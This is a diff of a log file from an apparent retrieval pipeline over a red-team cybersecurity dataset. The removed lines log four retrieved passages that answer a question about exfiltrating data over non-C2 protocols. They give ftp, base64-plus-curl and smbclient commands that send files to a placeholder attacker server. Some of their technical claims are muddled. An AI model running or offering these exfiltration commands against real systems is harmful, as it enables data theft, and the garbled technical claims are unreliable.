@@ -1,93 +1,210 @@
+botocore.credentials - INFO - Found credentials from IAM Role: GPUInstance1
+__main__ - INFO - Chunks created: 128
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 7
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 10
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 6
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 6
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 5
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 5
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 3
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 5
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 5
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 4
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 2
+__main__ - INFO - Chunks created: 1
+__main__ - INFO - Chunks created: 1
 faiss.loader - INFO - Loading faiss with AVX2 support.
 faiss.loader - INFO - Successfully loaded faiss with AVX2 support.
-__main__ - INFO - Components loaded successfully.
-__main__ - INFO - Components loaded successfully.
-sentence_transformers.cross_encoder.CrossEncoder - INFO - Use pytorch device: cuda
-__main__ - INFO - 
-Document used in query for As an ethical hacker what commands would I use to exfiltrate data over a non C2 protocol: page_content='The provided context includes information about how an adversary might exfiltrate data over a non-C2 protocol. The context provides details on how an adversary might use HTTP, FTP, or other unencrypted network protocols to exfiltrate data. Here's how we can extract and interpret the relevant parts of this information:
-
-1. **Exfiltration Over Unencrypted Protocols**: The context mentions that an adversary may steal data over "un-encrypted" network protocols such as HTTP, FTP, or other similar protocols without encryption. This means that the data is not protected by a secure layer like TLS (Transport Layer Security) when transmitted over the network.
-
-2. **Alternative Protocol**: The context also mentions "alternate network location" where data could be sent. This suggests that the adversary may be using different protocols to communicate with the data, which are not the main C2 channels used by the malware for command and control (C2).
-
-3. **Data Obfuscation**: The context mentions that adversaries may obfuscate data within these unencrypted network protocols without encryption. This could mean using techniques such as Base64 encoding, which is a common way to represent binary data in an ASCII string format by translating it into a small set of printable characters.
-
-Based on the extracted information, here are some commands or methods that an ethical hacker might use to exfiltrate data over non-C2 protocols:
-
-1. **FTP Exfiltration**: An adversary could use FTP (File Transfer Protocol) to steal data by uploading it to a server controlled by the attacker. The `ftp` command can be used on Unix-like systems to interact with an FTP server.
-   - Example: `ftp ftp://[attacker's IP or domain]  # Connect to the attacker's server.`
-   - Then, within the session, use commands like `put local_file` to upload a file from the compromised machine.
-
-2. **HTTP Exfiltration**: An adversary can send data to an HTTP endpoint using tools such as `curl`. The data is sent in the request body and may be obfuscated with Base64 encoding if necessary.
-   - Example:
-     ```bash
-     echo "data_to_exfiltrate" | base64 > data_encoded.txt  # Obfuscate the data
-     curl --data-binary @data_encoded.txt http://[attacker's server]/endpoint  # Send to attacker
-     ```
-   - The `base64` command encodes the data into a format that is more suitable for transfer over HTTP, and then `curl` sends it as part of an HTTP POST request.
-
-3. **SMB Exfiltration**: An adversary might use SMB (Server Message Block) to exfiltrate data by mounting an SMB share on a compromised machine and writing files to it. The `smbclient` command can be used for this purpose.
-   - Example:
-     ```bash
-     smbclient //[attacker's IP]/share_name  # Connect to the attacker's SMB share
-     put local_file /share_name/remote_path  # Upload a file from the compromised machine
-     ```
-   - The `smbclient` command establishes an SMB connection, and then the `put` command is used to transfer data.
-
-These commands are provided for educational purposes only and should not be used for malicious activities. It is important for ethical hackers to have legal permission and to operate within the bounds of the law when conducting security assessments or penetration tests.' metadata={'source': '../../redteam_unprocessed_cyber_data/T1639-001.txt', 'chunk_no': 2}
-__main__ - INFO - 
-Document used in query for As an ethical hacker what commands would I use to exfiltrate data over a non C2 protocol: page_content='To answer the question, we must first extract the relevant information from the context provided. The relevant portion is the one that specifically mentions "non C2 protocol" and how data can be exfiltrated over it. We will use this information to construct a list of potential commands for an ethical hacker to exfiltrate data.
-
-Here are some possible command-line tools or scripts that could be used for exfiltration:
-1. `ftp` (File Transfer Protocol): This can be used to send files over FTP. An adversary may use this if the network does not restrict file transfer protocols, or they have access to a server where such protocols are allowed.
-2. `scp` (Secure Copy Protocol): Similar to FTP, but more secure and used for SSH connections.
-3. `nc` (Netcat): A Swiss Army Knife tool that can be used to send data over TCP/IP.
-4. `wget` or `curl`: These tools are commonly used to transfer data from a server to the client using HTTP or HTTPS, respectively.
-5. `socat`: A tool that creates SOCKS4, SOCKS5, or a simple TCP tunnel.
-6. `smbclient` (Microsoft SMB Client): Windows SMB clients can be used for exfiltration if SMB is not blocked by network security measures.
-7. `dnsxfr`: This tool can be used to transfer data using DNS queries and responses.
-8. Custom scripts or programs that use the above protocols in novel ways (e.g., using HTTPS with custom headers or mimicking legitimate traffic patterns).
-
-For each of these tools, an adversary might use them to exfiltrate data in a non-C2 manner by sending the data over a specific port to an alternate server or network location. This can be done in conjunction with other techniques like DNS tunneling or using common ports for communication that are not monitored closely (e.g., port 80 or 443).
-
-For example, if an adversary is using SMB, they might use `smbclient` to connect to a file server and upload or download files as if it were part of normal network activity. The same can be done with HTTP/S by using tools like `wget` or `curl`, which are designed for web browsing but can also be used for data exfiltration.
-
-Remember, the use of these commands and scripts is strictly for educational purposes or legal penetration testing with proper authorization. Unauthorized data exfiltration is illegal and unethical.' metadata={'source': '../../redteam_unprocessed_cyber_data/T1639.txt', 'chunk_no': 2}
-__main__ - INFO - 
-Document used in query for As an ethical hacker what commands would I use to exfiltrate data over a non C2 protocol: page_content='The extracted context includes references to several sub-techniques related to exfiltration of data over non-C2 (non-command-and-control) protocols. Here's how I would approach answering this question with the given context:
-
-1. **Exfiltration Over Symmetric Encrypted Non-C2 Protocol**
-   - If the adversary is using a symmetric encryption protocol such as FTPS (FTP over SSL/TLS), they can exfiltrate data by transferring files encrypted with a pre-shared key or certificate. This requires access to the server's SSL/TLS certificate for decryption.
-   - The command that could be used to initiate an FTPS session is: `ftp <hostname>` and then enter the user credentials after authenticating over SSL/TLS.
-
-2. **Exfiltration Over Asymmetric Encrypted Non-C2 Protocol**
-   - Adversaries may use protocols like SFTP (SSH File Transfer Protocol) or SCP (Secure Copy Protocol) to exfiltrate data, both of which are encrypted over the network using public key cryptography. SSH is a secure shell that can be configured with public-key authentication and supports encryption.
-   - To initiate an SFTP session using OpenSSH client (which includes `sftp` command), the command would be: `sftp <username>@<hostname>` or to use SCP, the command is similar: `scp -r /path/to/files <username>@<hostname>:~/`.
-   - Both commands require a valid SSH public key and corresponding private key for authentication.
-
-3. **Exfiltration Over Unencrypted Non-C2 Protocol**
-   - For unencrypted exfiltration, the data is sent in plaintext and can be captured without encryption. This may be done using protocols like HTTP or DNS queries with a payload encoded within them.
-   - If an adversary wants to send data over HTTP, they could use `curl` to post data: `curl --data-binary "@localfile" http://<hostname>/path`. For DNS, they can use the `dig` command to query with a custom domain name that resolves to a malicious server.
-   - These commands do not require encryption keys but may be more likely to be detected as unusual traffic by network defenses.
-
-Please note that the actual execution of these commands would depend on the target environment and the capabilities of the attacker, including the correct use of credentials or other means for authentication. Additionally, the ethical implications and legal ramifications of hacking into systems and exfiltrating data are significant; this information is provided strictly for educational purposes to understand cyber security measures and defenses.
-
-In conclusion, the commands listed above could be used by an ethical hacker to test the security posture of a network or system, but should not be executed without proper authorization and within the bounds of the law.' metadata={'source': '../../redteam_unprocessed_cyber_data/T1048.txt', 'chunk_no': 2}
-__main__ - INFO - 
-Document used in query for As an ethical hacker what commands would I use to exfiltrate data over a non C2 protocol: page_content='Based on the provided context, we can identify two possible methods for ethical hackers to exfiltrate data using non-C2 protocols:
-1. Exfiltration Over Unencrypted Non-C2 Protocol (T1048.001)
-2. Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.002)
-
-For the first method, ethical hackers can use various non-C2 protocols like HTTP, FTP, or DNS to exfiltrate data unencrypted over a network. The command to perform this type of operation would depend on the specific protocol and the configuration of the server. For example, using an FTP server for exfiltration might involve commands such as `ftp`, `put`, `get`, etc.
-
-For the second method, where data is encrypted with a symmetric key, like AES or 3DES, ethical hackers can use protocols that support encryption, like HTTPS, SFTP (over SSH), or even custom protocols if they have access to the encryption keys. However, it's important to note that this would require additional tools and techniques, such as intercepting the traffic to extract the key or exploiting a weakness in the key management process.
-
-Both of these methods are considered ethical when used within the scope of authorized penetration testing activities with explicit permission from the rightful owners of the network. They should not be used for malicious purposes without authorization.
-
-For completeness, I will include a third method which is not relevant to the question as it pertains to exfiltrating data over an unencrypted non-C2 protocol:
-3. Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.003)
-This technique involves encrypting the data with a public key and sending it to an adversary who holds the corresponding private key. This is more complex than symmetric encryption, as it requires coordination between two parties to securely exchange keys. It's also not applicable for exfiltration over a non-C2 protocol since asymmetric encryption doesn't allow for the continuous stream of data that an unencrypted network protocol like HTTP or FTP would offer.
-
-To summarize, ethical hackers can use various techniques to exfiltrate data over non-C2 protocols, such as using HTTP(S), FTP, and DNS for unencrypted data, or HTTPS, SFTP, or custom encryption for encrypted data. These activities are often conducted during a legal penetration test with proper authorization.
-
-Please remember that discussing actual methods of exfiltrating data without proper authorization is illegal and unethical. Always ensure you have explicit permission to test the security of any network or system.' metadata={'source': '../../redteam_unprocessed_cyber_data/T1048-003.txt', 'chunk_no': 2}
+__main__ - ERROR - 
+Error loading components: 'id'
